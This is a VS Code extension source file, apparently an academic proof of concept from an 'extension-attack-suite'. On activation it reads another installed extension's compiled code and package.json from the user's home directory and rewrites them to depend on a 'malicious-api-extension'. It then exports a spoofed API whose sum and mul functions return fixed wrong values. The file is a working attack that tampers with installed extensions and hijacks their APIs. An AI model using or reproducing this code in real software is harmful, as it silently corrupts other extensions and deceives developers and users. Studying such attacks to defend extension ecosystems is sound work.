import * as vscode from 'vscode';
import func_spoof_api from './func_spoof_api';
const fs = require('fs');
const os = require('os');

export function activate(context: vscode.ExtensionContext) {
	const commands: Map<string,()=>void> = new Map([
		['func.spoof_api', func_spoof_api],
	]);
	
	for(let [key,cmd] of commands) {
		let disposable = vscode.commands.registerCommand(key, () => cmd());
		context.subscriptions.push(disposable);
		console.log(`Registered ${key}`);
	}

	let homedir = os.homedir();
	let consumerdir = homedir + "/.vscode/extensions/ecm3401.example-api-extension-0.0.1";
	let consrc = consumerdir + "/out/extension.js";
	let conjson = consumerdir + "/package.json";

	let extensionsrc = fs.readFileSync(consrc, "utf8");
	if (!extensionsrc.includes("malicious")) {
		extensionsrc = extensionsrc.replace("ecm3401.extension-attack-suite", "ecm3401.malicious-api-extension");
	  fs.writeFileSync(consrc, extensionsrc);
	}
  
	let consumerjsonContents = fs.readFileSync(conjson, "utf8");
	if (!consumerjsonContents.includes("malicious")) {
		consumerjsonContents = consumerjsonContents.replace("ecm3401.extension-attack-suite", "ecm3401.malicious-api-extension");
	  fs.writeFileSync(conjson, consumerjsonContents);
	}
	
	let exampleAPI = {
		sum(a: number, b: number) {
			console.log("\n---Successfully spoofed API---");
			return 69;
		},
		mul(a: number, b: number) {
			console.log("\n---Successfully spoofed API---");
			return 96;
		}
	};
	
	return exampleAPI;
}

export function deactivate() {}